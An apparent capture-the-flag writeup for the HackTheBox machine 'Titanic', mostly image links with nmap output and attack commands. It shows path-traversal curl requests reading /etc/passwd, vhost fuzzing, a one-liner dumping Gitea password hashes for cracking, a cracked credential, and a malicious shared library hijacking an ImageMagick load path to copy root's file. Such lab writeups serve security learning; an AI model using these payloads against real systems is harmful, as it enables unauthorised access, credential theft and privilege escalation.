---
title: "Titanic"
date: 2025-04-12
categories: HTB
tags: ["htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb", "titanic"]
---

# Enumeration
## Nmap
TCP
```sh
Scanned at 2025-02-19 09:37:11 AEDT for 30s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS 
```
## HTTP
![/assets/images/titanic3.png]
standard
![/assets/images/titanic4.png]

deluxe
![/assets/images/titanic6.png]

![/assets/images/titanic7.png]

```sh
# unecoded
curl http://titanic.htb/download?ticket=php://filter/resource=admin.php

# encoded
curl http://titanic.htb/download?ticket=php://filter/convert.base64-encode/resource=admin.php

curl http://titanic.htb/download?ticket=ad6afd0b-171b-480a-b230-28970a343179/etc/passwd
```

![/assets/images/titanic10.png]


![/assets/images/titanic5.png]

![/assets/images/titanic8.png]

![/assets/images/titanic18.png]

![/assets/images/titanic2.png]

![/assets/images/titanic9.png]

```sh
# sub-domain fuzzing (vhost)
ffuf -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

![/assets/images/titanic11.png]

dev.titanic.htb
![/assets/images/titanic12.png]

![/assets/images/titanic13.png]

`admin:admin` `admin:password` did not work.
sign up

![/assets/images/titanic14.png]

![/assets/images/titanic15.png]

![/assets/images/titanic16.png]
![/assets/images/titanic17.png]

![/assets/images/titanic19.png]

https://0xdf.gitlab.io/2024/12/14/htb-compiled.html

```sh
/data/gitea/gitea.db
```

![[/assets/images/titanic21.png]]

https://0xdf.gitlab.io/2024/12/14/htb-compiled.html
get user hases 
```sh
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

![[/assets/images/titanic22.png]]
![[/assets/images/titanic23.png]]

```sh
# creds
developer : 25282528
```
## SMB

# Foothold
![/assets/images/titanic24.png]

# Privilege Escalation
## Enumeration
![/assets/images/titanic25.png]

![/assets/images/titanic26.png]
-> Writable path abuse 

![/assets/images/titanic27.png]
## Attempts
https://www.cybersecurity-help.cz/vdb/SB2024072801

![/assets/images/titanic28.png]

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

### Read the flag
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```

![/assets/images/titanic29.png]

### Get a shell
![Pasted image 20250219153212.png]
